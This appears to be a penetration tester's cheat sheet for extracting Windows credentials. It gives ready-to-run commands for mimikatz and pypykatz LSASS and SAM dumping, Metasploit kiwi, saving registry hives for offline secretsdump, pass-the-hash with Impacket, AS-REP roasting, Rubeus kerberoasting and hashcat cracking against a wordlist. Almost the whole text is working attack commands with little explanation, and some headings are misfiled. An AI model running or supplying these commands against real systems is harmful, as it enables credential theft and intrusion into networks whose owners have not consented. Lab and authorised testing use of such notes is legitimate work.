# Password Extraction

### mimikatz/pypykatz

Need to match architecture

```bash
privilege::debug
20 ‘OK’

sekurlsa::logonPasswords
lsadump::sam
lsadump::lsa /patch
lsadump::secrets
kerberos::list

mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

pypykatz lsa minidump filename.DMP
```

### Metasploit

```
load kiwi

creds_all
lsa_dump_lsa
lsa_dump_secrets
kerberos_list
```

## Kerberoasting

### Impacket

Get a copy of the SYSTEM, SECURITY and SAM hives and download them back to your local system.

```
C:> reg.exe save hklm\sam c:\windows\temp\sam.save
C:> reg.exe save hklm\security c:\windows\temp\security.save
C:> reg.exe save hklm\system c:\windows\temp\system.save

$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

impacket-secretsdump backup@spookysec.local # requires password for user
impacket-secretsdump Administrator@10.11.1.1 -hashes 'NTLM:NTLM'
impacket-GetNPUsers spookysec.local/ -usersfile usernames.txt -format hashcat # Requires "Does not require Pre-Authentication" be set
```

### Rubeus

```
.\Rubeus.exe kerberoast
hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt --force
```

#### Cracking passwords

```
hashcat -m 13100 --force <TGSs_file> /usr/share/wordlists/rockyou.txt
```
